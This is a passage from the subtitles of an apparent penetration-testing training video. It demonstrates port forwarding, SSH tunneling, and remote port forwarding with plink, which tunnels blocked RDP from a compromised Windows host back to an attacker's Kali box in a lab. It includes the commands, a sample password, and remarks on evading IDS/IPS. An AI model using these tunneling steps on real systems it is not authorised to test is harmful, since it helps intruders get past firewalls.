file has\nbeen configured correctly.\n\n116\n00:06:21.290 --> 00:06:25.466\nNow we need to jump over to our browser,\nall right.\n\n117\n00:06:25.466 --> 00:06:31.949\nSo actually, so in this scenario,\nthis is my Windows 7 machine and\n\n118\n00:06:31.949 --> 00:06:36.178\nit's acting as our cool web server, okay.\n\n119\n00:06:36.178 --> 00:06:40.069\nAnd it is so yeah, maybe I yeah,\nit is acting as our cool web server.\n\n120\n00:06:41.180 --> 00:06:43.540\nIt is running port 80,\nit's got Apache running.\n\n121\n00:06:43.540 --> 00:06:48.280\nAs you can see,\nif I open up my browser, and\n\n122\n00:06:48.280 --> 00:06:55.220\nI type in 127.0.0.1,\nI get My Guestbook that I created.\n\n123\n00:06:55.220 --> 00:06:57.600\nI didn't start the SQL back end, so\n\n124\n00:06:57.600 --> 00:07:01.180\nI'm getting an error here, but\njust a basic website, right?\n\n125\n00:07:01.180 --> 00:07:02.670\nThat's my cool website.\n\n126\n00:07:02.670 --> 00:07:03.660\n&gt;&gt; That's pretty cool, Daniel.\n\n127\n00:07:03.660 --> 00:07:04.870\n&gt;&gt; Yeah, it's awesome.\n\n128\n00:07:04.870 --> 00:07:08.400\nI'm a super website creator, obviously,\n&gt;&gt; [LAUGH]\n\n129\n00:07:08.400 --> 00:07:09.020\n&gt;&gt; Here's my client,\n\n130\n00:07:09.020 --> 00:07:10.970\nI'm just gonna use my MacBook.\n\n131\n00:07:10.970 --> 00:07:16.273\nI will go to Firefox here,\n\n132\n00:07:16.273 --> 00:07:19.172\nfire that up.\n\n133\n00:07:19.172 --> 00:07:23.559\nAnd I will browse to http:// and\n\n134\n00:07:23.559 --> 00:07:27.793\nI'm gonna browse to my Kali box,\n\n135\n00:07:27.793 --> 00:07:32.224\ncuz that's what bound the ports.\n\n136\n00:07:32.224 --> 00:07:32.929\nRight, but\nI wonder what happens when I do that?\n\n137\n00:07:32.929 --> 00:07:33.633\nAll right, we'll see.\n\n138\n00:07:33.633 --> 00:07:41.083\n192.168.219.146, and\nthen that port I set, so :2222.\n\n139\n00:07:41.083 --> 00:07:45.790\nHit Return, and look what I get.\n\n140\n00:07:45.790 --> 00:07:47.210\nSo what did it do?\n\n141\n00:07:47.210 --> 00:07:49.141\nIt contacted the Kali box.\n\n142\n00:07:49.141 --> 00:07:52.402\nThe Kali box says you\ncame in on port 2222.\n\n143\n00:07:52.402 --> 00:07:56.754\nI've got a service that says if you come\nin on that port To redirect you to this\n\n144\n00:07:56.754 --> 00:08:00.560\nweb server on port 80 and\nthen return that back to you.\n\n145\n00:08:00.560 --> 00:08:03.188\nSo I get this instead\nof it cannot be found,\n\n146\n00:08:03.188 --> 00:08:05.527\nbecause I'm not running a page on it.\n\n147\n00:08:05.527 --> 00:08:06.054\n&gt;&gt; Fantastic.\n\n148\n00:08:06.054 --> 00:08:07.510\n&gt;&gt; So very cool right?\n\n149\n00:08:07.510 --> 00:08:09.090\nThat's basic port forwarding.\n\n150\n00:08:10.480 --> 00:08:12.170\nSo let's bump our game up just a hair.\n\n151\n00:08:13.280 --> 00:08:18.040\nLet's go back over here, or actually\nlet's bring up our simple diagram.\n\n152\n00:08:19.670 --> 00:08:21.037\nLet's look at SSH tunneling.\n\n153\n00:08:23.525 --> 00:08:26.969\nNot really seeing a lot of difference\nwhen it comes to the diagram,\n\n154\n00:08:26.969 --> 00:08:29.430\nexcept for some specific information.\n\n155\n00:08:29.430 --> 00:08:32.150\nFirewall's still blocking\noutbound web requests.\n\n156\n00:08:32.150 --> 00:08:34.700\nBut the time what we're gonna\ndo is instead of using rinetd as\n\n157\n00:08:34.700 --> 00:08:35.589\na service, we're going use SSH.\n\n158\n00:08:37.180 --> 00:08:39.980\nSSH can actually do this stuff for us.\n\n159\n00:08:39.980 --> 00:08:41.560\nSo let's take a look at\nall the information there.\n\n160\n00:08:41.560 --> 00:08:44.950\nThank you, Megan, for doing that for us.\n\n161\n00:08:44.950 --> 00:08:49.080\nWe've got a cool web server, now all we\nhave to do is make sure it's running SSH\n\n162\n00:08:49.080 --> 00:08:51.580\non our, basically becoming our proxy here.\n\n163\n00:08:51.580 --> 00:08:54.620\nAnd it's just running on port 22.\n\n164\n00:08:54.620 --> 00:08:56.560\nIt's not being blocked by this.\n\n165\n00:08:56.560 --> 00:09:01.560\nAnd over here we are going to\nbind that to port 8080 just\n\n166\n00:09:02.720 --> 00:09:05.690\nso I don't mess with RINETD,\nI'll just choose a different port.\n\n167\n00:09:05.690 --> 00:09:08.430\n8080, that's a common port used for\nproxying.\n\n168\n00:09:09.810 --> 00:09:13.070\nAnd then when our client\nmachine fires up a web browser,\n\n169\n00:09:13.070 --> 00:09:17.230\nwe're going to go to\n127.0.0.1 instead of Going\n\n170\n00:09:19.750 --> 00:09:24.870\nto 192, the collie's box cuz it's a little\nweird in the way this works, okay?\n\n171\n00:09:24.870 --> 00:09:26.165\nLet me make sure I'm following my notes,\n\n172\n00:09:26.165 --> 00:09:28.390\nI want to make sure I get you every\npiece of information I wanna tell you.\n\n173\n00:09:28.390 --> 00:09:36.870\nSo what we do is we bind an egress allowed\nlocal ports from our local machine.\n\n174\n00:09:36.870 --> 00:09:43.760\nSo on that machine, so\nthe apple My Apple Box, my Macbook.\n\n175\n00:09:43.760 --> 00:09:47.410\nMy Macbook is this guy,\nthe clam machine in this scenario.\n\n176\n00:09:49.170 --> 00:09:53.630\nSo we're gonna bind our local ports,\nthat's why we're using 127, but\n\n177\n00:09:53.630 --> 00:09:56.880\nwe're binding in port 80 locally,\nthat's the service.\n\n178\n00:09:56.880 --> 00:10:02.190\nI know, if this is what is he talking\nabout cuz it's a little crazy.\n\n179\n00:10:02.190 --> 00:10:05.450\nI know how to do this, and every time,\nI have to stop and go, okay, Lowrie,\n\n180\n00:10:05.450 --> 00:10:09.870\nget it straight in your head,\nwe're doing SSH tunneling.\n\n181\n00:10:09.870 --> 00:10:13.390\nSo I'm going to bind a local\nport on a local machine, and\n\n182\n00:10:13.390 --> 00:10:17.900\nwhen I use my browser,\nI'm gonna connect to my local port.\n\n183\n00:10:17.900 --> 00:10:22.924\nThat local port resides on my local host,\nhence the 127.0.0.1,\n\n184\n00:10:22.924 --> 00:10:27.010\ninstead of the way we did it before,\nwhich was port forwarding okay?\n\n185\n00:10:28.100 --> 00:10:32.720\nHopefully that makes sense, so the host\nwill connect the egress allowed port and\n\n186\n00:10:32.720 --> 00:10:35.510\nreceive data from the proxy.\n\n187\n00:10:35.510 --> 00:10:38.000\nAnd because we're using a SSH guess what?\n\n188\n00:10:38.000 --> 00:10:39.320\nEncrypted traffic.\n\n189\n00:10:39.320 --> 00:10:40.350\n&gt;&gt; Perfect.\n&gt;&gt; That's always nice.\n\n190\n00:10:40.350 --> 00:10:41.570\n&gt;&gt; They can't even see what I'm doing.\n\n191\n00:10:41.570 --> 00:10:43.639\n&gt;&gt; IDSs, IPSs you're having\na hard time at this point.\n\n192\n00:10:45.170 --> 00:10:51.570\nSo [LAUGH] let's do that,\nlet's configure our SSH, using a port that\n\n193\n00:10:51.570 --> 00:10:55.620\nthe client's firewall doesn't block, which\nis fine, the 8080 is what we've chosen.\n\n194\n00:10:55.620 --> 00:11:01.840\nThen we connect from the client's, so\nthis is the client's, bring up a terminal.\n\n195\n00:11:01.840 --> 00:11:02.690\nI'm sorry, not a terminal.\n\n196\n00:11:03.870 --> 00:11:04.660\nYes, a terminal.\n\n197\n00:11:04.660 --> 00:11:05.220\nWhere's my terminal?\n\n198\n00:11:07.303 --> 00:11:09.990\nTerminal.\n\n199\n00:11:09.990 --> 00:11:11.900\nAnd that's part of the process here.\n\n200\n00:11:11.900 --> 00:11:17.963\nYou have to open a terminal SSH and\nyou'll say user at that proxy so\n\n201\n00:11:17.963 --> 00:11:24.450\nyou have to create a user account for\nSSH, and then log in using that.\n\n202\n00:11:24.450 --> 00:11:30.468\nSo I've got that FTP2@192.168.219.146.\n\n203\n00:11:30.468 --> 00:11:35.808\nAnd then we'll say -l and\nthen we'll give it that port number\n\n204\n00:11:35.808 --> 00:11:41.047\ncause that's the local port\nthat we wanna bind, 8080,\n\n205\n00:11:41.047 --> 00:11:45.890\nand then you do a colon and\nyou say where do you want to go?\n\n206\n00:11:45.890 --> 00:11:48.480\nOr where do you want to redirect to?\n\n207\n00:11:48.480 --> 00:11:53.795\nThat's gonna be our Windows machine\nthat's a really awesome website.\n\n208\n00:11:53.795 --> 00:11:58.712\nSo 192.168 I know how bad it is,\nthat's why I make fun of it, 19.200, and\n\n209\n00:11:58.712 --> 00:12:01.850\nthen, whatever port that is on,\nif I'm not mistaken.\n\n210\n00:12:01.850 --> 00:12:08.380\nYeah, so that's on port 80, and\nthen we should be good to go.\n\n211\n00:12:08.380 --> 00:12:12.690\nI'm pretty sure, yeah, if we hit return,\nit's gonna ask us for our password,\n\n212\n00:12:12.690 --> 00:12:16.980\ntype that in and\nnow we've made a connection.\n\n213\n00:12:16.980 --> 00:12:18.220\nThat's cool, the connection is made.\n\n214\n00:12:18.220 --> 00:12:21.970\nThe connection needs to be established for\nthis to work.\n\n215\n00:12:21.970 --> 00:12:25.416\nWe can then now open our browser and\ngo to,\n\n216\n00:12:25.416 --> 00:12:30.546\nI will close this link,\nI'll reopen it, so it's not there.\n\n217\n00:12:30.546 --> 00:12:38.280\nI will go to 127.0.0.1 port 8080,\nlike that.\n\n218\n00:12:38.280 --> 00:12:40.250\nWe wait for a sec, and look.\n\n219\n00:12:40.250 --> 00:12:41.770\n&gt;&gt; Voila.\n&gt;&gt; So we get the exact same kind of\n\n220\n00:12:41.770 --> 00:12:43.590\noutput, just in a different way.\n\n221\n00:12:43.590 --> 00:12:46.270\nAnd in this time,\nwe're using some encryption, okay?\n\n222\n00:12:46.270 --> 00:12:54.990\nSo very cool, that moves us on to\nremote port forwarding with SSH.\n\n223\n00:12:54.990 --> 00:12:58.340\nSo this is done from a compromised system.\n\n224\n00:12:58.340 --> 00:13:00.130\nI have a lovely diagram for this as well.\n\n225\n00:13:01.430 --> 00:13:02.460\nI can close this session.\n\n226\n00:13:04.070 --> 00:13:06.290\nKeep the terminal around\njust in case we'll need it,\n\n227\n00:13:06.290 --> 00:13:07.920\nwhich I'm pretty sure we will.\n\n228\n00:13:07.920 --> 00:13:09.540\nRemote port forwarding with SSH.\n\n229\n00:13:10.600 --> 00:13:15.170\nSo now the firewall is blocking\nall ports except port 80,\n\n230\n00:13:15.170 --> 00:13:19.030\ncuz apparently this is a web server\nthat we've compromised, port 443,\n\n231\n00:13:19.030 --> 00:13:23.790\nagain web, and then port 22 for\nSSH connectivity on the outside.\n\n232\n00:13:23.790 --> 00:13:29.040\nSo this is very administratively set up,\nbut we've compromised maybe the web API,\n\n233\n00:13:29.040 --> 00:13:33.290\nwe've done a SQL injection attack,local or\n\n234\n00:13:33.290 --> 00:13:37.440\nremote file inclusion attack, and\nwe've gained shell to this thing.\n\n235\n00:13:37.440 --> 00:13:41.490\nNow, we need to be able\nto give things to it,\n\n236\n00:13:41.490 --> 00:13:43.410\nmaybe move files, or something like that.\n\n237\n00:13:43.410 --> 00:13:46.520\nBut it's blocking,\nI don't have SSH connectivity.\n\n238\n00:13:46.520 --> 00:13:50.230\nI don't know the user name and\npassword yet, but I wanna get files so\n\n239\n00:13:50.230 --> 00:13:53.880\nthat I can maybe FG Dump,\nsomething like that.\n\n240\n00:13:53.880 --> 00:13:56.100\nSo that's why you might wanna use this.\n\n241\n00:13:56.100 --> 00:13:59.300\nSo here are the commands\nwe're gonna be using,\n\n242\n00:13:59.300 --> 00:14:03.350\nSSH User1 into our attack system, and\n\n243\n00:14:03.350 --> 00:14:07.990\nthen we're actually gonna remote desktop\nit, so that's the attack platform here.\n\n244\n00:14:07.990 --> 00:14:12.390\nRemote desktop, I do not see in\nthe exceptions over here Port 3389,\n\n245\n00:14:12.390 --> 00:14:13.650\ndo you see that Mike?\n\n246\n00:14:13.650 --> 00:14:14.325\nIt's not showing.\n\n247\n00:14:14.325 --> 00:14:17.390\n&gt;&gt; [INAUDIBLE]\n&gt;&gt; Nope, so for our intents and purposes,\n\n248\n00:14:17.390 --> 00:14:19.450\nPort 3389 is being blocked.\n\n249\n00:14:19.450 --> 00:14:25.197\nSo if I'm the attacker over here,\neven though I've compromised the machine,\n\n250\n00:14:25.197 --> 00:14:30.084\nI can't just fire up our desktop and\nsay our desktop user, user1,\n\n251\n00:14:30.084 --> 00:14:34.920\n192168, 219, 200,\nhit Enter I'm gonna get nope.\n\n252\n00:14:34.920 --> 00:14:40.260\nThat's cannot contact, gonna get an error,\nbecause the firewall is blocking it.\n\n253\n00:14:40.260 --> 00:14:42.690\nHow can I bypass that type of security?\n\n254\n00:14:42.690 --> 00:14:44.600\nThis is how we can do that.\n\n255\n00:14:44.600 --> 00:14:49.860\nSo let's see here,\nfrom the compromised server,\n\n256\n00:14:49.860 --> 00:14:55.490\nin this case the compromised server is\ngoing to be our Windows 7 box, okay?\n\n257\n00:14:56.580 --> 00:14:57.590\nSo let's jump over there.\n\n258\n00:14:59.640 --> 00:15:05.790\nAnd from here, I'm logged in, and I'm\ngonna say I could actually compromise it.\n\n259\n00:15:05.790 --> 00:15:07.640\nWe've seen that with\na buffer of a flow attack.\n\n260\n00:15:07.640 --> 00:15:10.180\nI could do that and\ncompromise it that way but,\n\n261\n00:15:10.180 --> 00:15:13.050\nfor ease of use, what do you think Mike?\n\n262\n00:15:13.050 --> 00:15:15.470\nShould I actually compromise\nthe machine and then do it?\n\n263\n00:15:15.470 --> 00:15:18.670\n&gt;&gt; I wanna make sure we get through\nall of this wonderful information.\n\n264\n00:15:18.670 --> 00:15:19.430\n&gt;&gt; Mike's like, I'm ready man.\n\n265\n00:15:19.430 --> 00:15:21.570\n&gt;&gt; You guys have seen\nthe compromised before, so\n\n266\n00:15:21.570 --> 00:15:24.350\nlet's just okay now that's\nbeen compromised, what's next?\n\n267\n00:15:24.350 --> 00:15:27.680\n&gt;&gt; All right so we're going to start from,\nwe have compromise this machine and\n\n268\n00:15:27.680 --> 00:15:29.670\nwe only have a black box terminal.\n\n269\n00:15:29.670 --> 00:15:33.410\nSo we bring our black box terminal\nmaybe we've use our FTP commands we so\n\n270\n00:15:33.410 --> 00:15:34.060\nit before.\n\n271\n00:15:34.060 --> 00:15:39.140\nOur transfer fund to get,\nI love the little SSH client because\n\n272\n00:15:39.140 --> 00:15:43.710\ntypically not seeing us client it's\ninstalled on Windows machines.\n\n273\n00:15:43.710 --> 00:15:45.756\nWe're gonna need that, cuz we need SSH.\n\n274\n00:15:45.756 --> 00:15:51.142\nI like plink, it's a great SSH client,\nit does SSH, so find your copy of plink.\n\n275\n00:15:51.142 --> 00:15:56.099\nGoogle, Oracle or the Internet,\ngrab that and file transfer it over.\n\n276\n00:15:56.099 --> 00:15:57.659\n&gt;&gt; Can you [INAUDIBLE] Azure?\n\n277\n00:15:57.659 --> 00:15:58.214\n&gt;&gt; Surely.\n\n278\n00:15:58.214 --> 00:15:59.511\n&gt;&gt; You know I can.\n\n279\n00:15:59.511 --> 00:16:01.782\nThank you for reminding me, Michael.\n\n280\n00:16:01.782 --> 00:16:05.068\nLet me scooch that over there.\n\n281\n00:16:05.068 --> 00:16:07.864\nHopefully that's a little better for\nyou good folks out there.\n\n282\n00:16:07.864 --> 00:16:10.342\n&gt;&gt; Much better.\n&gt;&gt; All right, so I've installed PLINK,\n\n283\n00:16:10.342 --> 00:16:14.430\nI've dropped it into system 32 so\nI can call it from anywhere.\n\n284\n00:16:14.430 --> 00:16:18.710\nI just say plink- l.\n\n285\n00:16:18.710 --> 00:16:22.743\nIt's gonna look very similar to the way\nwe did the SSH one, just a minute ago.\n\n286\n00:16:22.743 --> 00:16:28.003\n-l, our user is FTP2, we'll say -pw,\n\n287\n00:16:28.003 --> 00:16:32.103\nwhich is saying take a password.\n\n288\n00:16:32.103 --> 00:16:35.338\nOur password is password1.\n\n289\n00:16:35.338 --> 00:16:39.808\nMaybe we've already compromised\nthat password, and we've got that.\n\n290\n00:16:39.808 --> 00:16:43.838\nActually, I'm sorry, that's the password\nof our user on the SSH machine,\n\n291\n00:16:43.838 --> 00:16:44.900\nthat's what it is.\n\n292\n00:16:44.900 --> 00:16:48.420\nI use password1 so much, I don't even\nknow which user I'm [LAUGH] referring to.\n\n293\n00:16:48.420 --> 00:16:53.490\nAnd then we say what SSH server\nare we trying to contact?\n\n294\n00:16:53.490 --> 00:16:55.848\nThat's our attacking box, our Kali box.\n\n295\n00:16:55.848 --> 00:16:59.103\n192.168.219.146 for me.\n\n296\n00:17:00.170 --> 00:17:05.480\nThen we say -R and\nthat's basically how we bind a service.\n\n297\n00:17:05.480 --> 00:17:11.647\nNow we need to use a different,\nwe're basically saying use a local port,\n\n298\n00:17:11.647 --> 00:17:19.055\nand don't use the same one as the port\nyou're trying to connect with back, right?\n\n299\n00:17:19.055 --> 00:17:23.420\nI like to use probably like one off,\nso we're trying to connect to 3389,\n\n300\n00:17:23.420 --> 00:17:25.179\nso I'll use 3388, okay?\n\n301\n00:17:25.179 --> 00:17:30.827\nSo I'll say 3388:127.0.0.1.\n\n302\n00:17:30.827 --> 00:17:34.493\nRemember, it's a local port\nto my attacking machine,\n\n303\n00:17:34.493 --> 00:17:37.700\nnot the compromised machine,\nvery important.\n\n304\n00:17:39.370 --> 00:17:44.250\nAll right and then colon the port you\nwant to actually contact, so 3389.\n\n305\n00:17:44.250 --> 00:17:47.440\nSo it knows what to redirect, all right.\n\n306\n00:17:47.440 --> 00:17:50.260\nThat all being said, I hit return.\n\n307\n00:17:50.260 --> 00:17:54.940\nIt's now giving me a shell\nprompt cuz I'm logged in.\n\n308\n00:17:54.940 --> 00:17:56.645\nI'm getting actual Linux access.\n\n309\n00:17:56.645 --> 00:17:59.160\nObviously there's nothing there or\nit's just limited.\n\n310\n00:18:00.210 --> 00:18:01.910\nBut I go back to my Kali machine.\n\n311\n00:18:01.910 --> 00:18:04.590\nI can control out like that.\n\n312\n00:18:06.100 --> 00:18:08.576\nAnd now we run our desktop, okay.\n\n313\n00:18:08.576 --> 00:18:15.015\nSo we say rdesktop, 127.0.0.1,\n\n314\n00:18:15.015 --> 00:18:18.325\nand then :3388.\n\n315\n00:18:18.325 --> 00:18:20.586\nCuz remember, when we bound the port,\n\n316\n00:18:20.586 --> 00:18:23.610\nwe bound it to a local port\non the attacking machine.\n\n317\n00:18:23.610 --> 00:18:27.400\nAnd it wasn't the same port,\nwe're gonna redirect to that port.\n\n318\n00:18:27.400 --> 00:18:32.456\nSo we're gonna redirect any 3389 traffic\nthrough SSH to our attacking machine.\n\n319\n00:18:32.456 --> 00:18:34.926\nThrough port 3388.\n\n320\n00:18:34.926 --> 00:18:38.908\nIf that all goes well we should\nbe receiving a remote desktop,\n\n321\n00:18:38.908 --> 00:18:42.672\nwhich is being blocked and\nnow I can log in as another user.\n\n322\n00:18:42.672 --> 00:18:48.899\nI have hacker and\nwhatever his password is.\n\n323\n00:18:48.899 --> 00:18:51.288\nAnd there you go, and\nit's giving me a log on message.\n\n324\n00:18:51.288 --> 00:18:53.280\nBut I won't kick myself out.\n\n325\n00:18:53.280 --> 00:18:54.000\nBut that's it right?\n\n326\n00:18:54.000 --> 00:18:55.250\nWe used SSH.\n\n327\n00:18:55.250 --> 00:18:56.641\nEncrypt that traffic,\n\n328\n00:18:56.641 --> 00:19:00.820\nredirect ports that are being blocked\nby a firewall to get around that.\n\n329\n00:19:00.820 --> 00:19:03.080\nSo very twisty thing.\n\n330\n00:19:03.080 --> 00:19:05.950\nYou're gonna have to spend some time\nwrapping your brain around that.\n\n331\n00:19:05.950 --> 00:19:08.700\nThe simple diagram will be available for\nyou.\n\n332\n00:19:08.700 --> 00:19:11.380\nAll my notes obviously will be available\nfor you, so do take some time with this.\n\n333\n00:19:11.380 --> 00:19:15.960\nIt does get mind-boggling\nto keep it all straight.\n\n334\n00:19:15.960 --> 00:19:16.968\nThere are more advanced.\n\n335\n00:19:16.968 --> 00:19:20.240\nYou can do dynamic host port forwarding.\n\n336\n00:19:20.240 --> 00:19:22.687\nCreate SOCKS4 and 5 proxies.\n\n337\n00:19:22.687 --> 00:19:24.206\nThat gets a little more advanced, and\n\n338\n00:19:24.206 --> 00:19:26.130\nmaybe one day I will come back and\ndo that.\n\n339\n00:19:26.130 --> 00:19:29.941\nBut for right now I think you got a good\nfoundation to be able to work around\n\n340\n00:19:29.941 --> 00:19:30.640\nfirewalls.\n\n341\n00:19:30.640 --> 00:19:33.280\n&gt;&gt; Well fantastic stuff there, Daniel.\n\n342\n00:19:33.280 --> 00:19:34.630\nReally good explanations.\n\n343\n00:19:34.630 --> 00:19:36.830\nGreat demonstrations as always.\n\n344\n00:19:36.830 --> 00:19:39.710\nAnd now these are techniques as\na pen tester, I need to know.\n\n345\n00:19:39.710 --> 00:19:42.757\nBecause I need to see if the company\nI'm doing this pen test on is\n\n346\n00:19:42.757 --> 00:19:43.800\nvulnerable to this.\n\n347\n00:19:43.800 --> 00:19:46.270\nThey're telling me that we've\nsecured it best we can.\n\n348\n00:19:46.270 --> 00:19:48.210\nOur firewall,\nyou're not gonna get through it.\n\n349\n00:19:48.210 --> 00:19:49.820\nYou're not gonna get around it.\n\n350\n00:19:49.820 --> 00:19:50.450\nWell let's see.\n\n351\n00:19:50.450 --> 00:19:53.140\nLet's see if we can take some\nof these techniques and do that.\n\n352\n00:19:53.140 --> 00:19:55.380\nSo we need to make sure\nwe're familiar with those.\n\n353\n00:19:55.380 --> 00:19:56.240\nWe appreciate that.\n\n354\n00:19:56.240 --> 00:19:59.270\nWe hope everybody out there\nenjoyed watching this one.\n\n355\n00:19:59.270 --> 00:20:02.280\nSigning off for ITPRO.TV,\nI've been your host Mike Rodrick.\n\n356\n00:20:02.280 --> 00:20:03.150\n&gt;&gt; And I'm Daniel Lowrie.\n\n357\n00:20:03.150 --> 00:20:05.488\n&gt;&gt; And we'll see you next time.\n\n358\n00:20:05.488 --> 00:20:11.570\n[MUSIC]\n\n359\n00:20:11.570 --> 00:20:14.583\n&gt;&gt; Thank you for watching ITPRO.TV.\n\n",
          "vimeoId": "202942511"
        }
      ],
      "title": "Penetration Testing"
    }
  ],
  "url": "penetration-testing",
  "vLab": false
}
